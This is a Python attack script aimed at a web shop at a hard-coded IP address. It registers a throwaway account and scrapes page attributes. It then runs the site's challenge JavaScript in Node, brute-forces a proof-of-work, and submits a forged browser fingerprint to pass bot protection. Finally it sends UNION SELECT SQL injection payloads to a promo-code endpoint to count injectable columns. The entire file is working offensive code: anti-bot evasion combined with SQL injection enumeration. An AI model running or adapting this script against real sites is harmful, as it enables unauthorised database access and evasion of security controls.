import requests
import re
import hashlib
import json
import subprocess
import time

base_url = "http://155.212.216.201:8080"
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def create_and_hs():
    s = requests.Session()
    s.headers.update({
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    uname = f"u_{int(time.time()*1000)%10000000}"
    s.post(f"{base_url}/register", data={"username": uname, "password": "Password123!"})
    
    r_co = s.get(f"{base_url}/checkout/13537")
    cid = re.search(r'meta name=["\']mk-c["\'] content=["\']([^"\']+)["\']', r_co.text).group(1)
    html_attrs = dict(re.findall(r'([\w\-]+)=["\']([^"\']*)["\']', re.search(r'<html\s+([^>]+)>', r_co.text).group(1)))
    body_attrs = dict(re.findall(r'([\w\-]+)=["\']([^"\']*)["\']', re.search(r'<body\s+([^>]+)>', r_co.text).group(1)))
    style_match = re.search(r'<style[^>]*>([\s\S]*?)</style>', r_co.text)
    css_vars = dict(re.findall(r'(--[\w\-]+)\s*:\s*([^;]+);', style_match.group(1))) if style_match else {}
    all_attrs = dict(re.findall(r'([\w\-]+)=["\']([^"\']*)["\']', r_co.text))

    r_boot = s.get(f"{base_url}/api/bootstrap?c={cid}").json()
    p_code = r_boot["p"]
    js_eval = f"""
    const html_attrs = {json.dumps(html_attrs)};
    const body_attrs = {json.dumps(body_attrs)};
    const css_vars = {json.dumps(css_vars)};
    const all_attrs = {json.dumps(all_attrs)};
    const document = {{
      documentElement: {{ getAttribute: (attr) => html_attrs[attr] || 0 }},
      body: {{ getAttribute: (attr) => body_attrs[attr] || 0 }},
      querySelector: (sel) => {{
        const m = sel.match(/\\[([\\w\\-]+)\\]/);
        if (m) {{
          const attr = m[1];
          if (all_attrs[attr] !== undefined) return {{ getAttribute: () => all_attrs[attr] }};
        }}
        return null;
      }}
    }};
    const getComputedStyle = () => ({{ getPropertyValue: (prop) => css_vars[prop] || '' }});
    const fn = new Function({json.dumps(p_code)});
    console.log(fn());
    """
    a_val = int(subprocess.check_output(["node", "-e", js_eval]).decode().strip())
    seed = r_boot["s"]
    diff = r_boot["d"]
    n = 0
    prefix = "0" * diff
    while True:
        h = hashlib.sha256(f"{seed}:{n}".encode()).hexdigest()
        if h.startswith(prefix):
            break
        n += 1
    sig = {
        "wd": False, "aut": [], "ua": ua, "lang": 2, "plug": 5, "chr": True, "uad": True,
        "ow": 1920, "oh": 1080, "iw": 1920, "ih": 950, "sw": 1920, "sh": 1080, "dpr": 1,
        "hc": 8, "dm": 8, "tz": "Europe/Moscow",
        "gl": "Google Inc. (NVIDIA) / ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
        "jit": 0.123456, "ev": 15, "t": 1250
    }
    hs_data = { "s": seed, "g": r_boot["g"], "n": str(n), "c": cid, "a": a_val, "f": sig }
    s.post(f"{base_url}/api/hs", json=hs_data)
    s.get(f"{base_url}/api/w/co?e=15&t=1300")
    s.headers.update({"X-Requested-With": "mk"})
    return s

s = create_and_hs()

# Test UNION SELECT with different column counts
for cols in range(1, 8):
    payload = f"' UNION SELECT " + ", ".join([f"'{i}'" for i in range(cols)]) + "--"
    r = s.post(f"{base_url}/api/v2/checkout/promo", json={"code": payload}).json()
    print(f"Cols {cols}: {r}")
    if r.get("ok") or ("SELECTs to the left and right" not in str(r)):
        if "sql" in str(r) and "SELECTs to the left and right" in str(r):
            pass
        else:
            print(f"==> Possible match on {cols} cols: {r}")
            break
    time.sleep(0.5)
